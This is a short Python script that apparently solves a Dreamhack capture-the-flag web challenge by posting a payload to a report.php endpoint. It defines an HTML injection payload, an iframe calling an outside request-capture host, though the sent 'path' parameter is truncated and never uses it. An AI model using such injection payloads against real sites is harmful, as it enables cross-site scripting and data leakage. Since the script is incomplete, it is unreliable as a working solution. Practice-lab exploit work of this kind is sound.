import requests

port = 10660
url_index = f"http://host3.dreamhack.games:{port}/"
url_report = url_index + "report.php"

script = "lol <iframe src='https://pmqyfdu.request.dreamhack.games' />"
param = {
  "path" : f'"+'
}
r = requests.post(url_report, data=param)

# request 받은 url에서 요청 확인